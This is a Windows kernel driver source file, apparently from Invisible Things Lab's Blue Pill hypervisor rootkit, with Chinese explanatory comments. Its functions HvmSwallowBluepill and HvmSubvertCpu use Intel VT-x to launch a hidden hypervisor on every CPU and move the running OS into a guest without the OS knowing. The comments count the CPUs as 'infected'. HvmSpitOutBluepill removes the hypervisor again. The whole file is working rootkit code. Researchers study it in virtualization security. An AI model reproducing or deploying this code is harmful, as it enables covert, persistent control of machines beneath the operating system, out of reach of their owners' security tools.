/* 
 * Copyright holder: Invisible Things Lab
 */

#include "hvm.h"
#include "hypercalls.h"
#include "traps.h"
#include "interrupts.h"

ULONG g_uSubvertedCPUs;
PHVM_DEPENDENT Hvm;

NTSTATUS HvmSubvertCpu (
  PVOID GuestRsp
)
{
    NTSTATUS Status;
    PCPU Cpu;
    PVOID HostKernelStackBase;
    PHYSICAL_ADDRESS phy_addr;

    KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

    // 为Guest分配内核栈(按页分配), 大小与Host相同
    HostKernelStackBase = ExAllocatePoolWithTag (NonPagedPool, HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE, MEM_TAG);
    if (!HostKernelStackBase)
    {
        KdPrint (("HvmSubvertCpu(): Failed to allocate host stack!\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (HostKernelStackBase, HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE);

  //
  // 设置Cpu数据结构的内存地址为 [栈顶-8h-sizeof(CPU)]
  //
  Cpu = (PCPU) ((PCHAR) HostKernelStackBase + HOST_STACK_SIZE_IN_PAGES * PAGE_SIZE - 8 - sizeof (CPU));

  Cpu->HostStack       = HostKernelStackBase;    // 内核栈基址
  Cpu->SelfPointer     = Cpu;                    // 自身的指针
  Cpu->ProcessorNumber = KeGetCurrentProcessorNumber ();  // 当前处理器数量
  Cpu->Nested          = FALSE;                  // TODISCOVER: 是否嵌套

  InitializeListHead (&Cpu->GeneralTrapsList);   // 初始化普通陷入事件记录链
  InitializeListHead (&Cpu->MsrTrapsList);       // 初始化MSR读写陷入事件记录链
  InitializeListHead (&Cpu->IoTrapsList);        // 初始化IO读写陷入事件记录链

  phy_addr.QuadPart = -1;
  Cpu->SparePage = MmAllocateContiguousMemory (PAGE_SIZE, phy_addr);
  if (!Cpu->SparePage) {
    KdPrint (("HvmSubvertCpu(): Failed to allocate 1 page for the dummy page (DPA_CONTIGUOUS)\n"));
    return STATUS_UNSUCCESSFUL;
  }

  // this is valid only for host page tables, as this VA may point into 2mb page in the guest.
  Cpu->SparePagePTE = (PULONG64) ((((ULONG64) (Cpu->SparePage) >> 9) & 0x7ffffffff8) + PT_BASE);

  //
  //  初始化所有VM_EXIT陷入事件对应的处理例程
  //
  Status = VmxRegisterTraps (Cpu);
  if ( Status )
  {
      KdPrint (("HvmSubvertCpu(): VmxRegisterTraps Failed! status : 0x%08hX\n", Status));
      return STATUS_UNSUCCESSFUL;
  }

  //
  // 准备VM要用到的数据结构 (VMON Region & VMCS for Intel-Vt)
  // GuestRip和GuestRsp会被填进VMCS结构，代表Guest原本的代码位置和栈顶指针
  //
  Status = VmxInitialize (Cpu, CmResumeGuest, GuestRsp);
  if ( Status )
  {
      KdPrint (("HvmSubvertCpu(): VmxInitialize Failed! status 0x%08hX\n", Status));
      return Status;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);  // 已侵染的CPU数+=1

  // 一切准备工作完毕，使该CPU进入虚拟机
  __vmx_vmlaunch();

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return Status;
}

NTSTATUS
HvmSpitOutBluepill ()
{
    NTSTATUS Status;
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        Status = HcMakeHypercall (NBP_HYPERCALL_UNLOAD, 0, NULL);
        if ( Status )
        {
            KdPrint (("HcMakeHypercall() failed on processor #%d, status 0x%08hX\n",
                KeGetCurrentProcessorNumber (),
                Status));
        }

        KeLowerIrql (OldIrql);
        clear_in_cr4 (X86_CR4_VMXE);
        KeRevertToUserAffinityThread ();
    }

    return STATUS_SUCCESS;
}

NTSTATUS
HvmSwallowBluepill ()
{
    NTSTATUS Status;
    KIRQL OldIrql;
    CHAR i;

    // 遍历所有处理器
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // 将代码运行在指定CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        Status = CmSubvert (NULL);  // CmSubvert的流程是保存所有寄存器(除了段寄存器)的内容到栈里后，调用HvmSubvertCpu

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();

        if (Status)
        {
            KdPrint (("HvmSwallowBluepill(): HvmSubvertCpu() failed with status 0x%08hX\n", Status));
            break;
        }
    }

    if (KeNumberProcessors != g_uSubvertedCPUs)  // 如果没有对每个核都侵染成功，则撤销更改
    {
        HvmSpitOutBluepill ();
        return STATUS_UNSUCCESSFUL;
    }

    return Status;
}
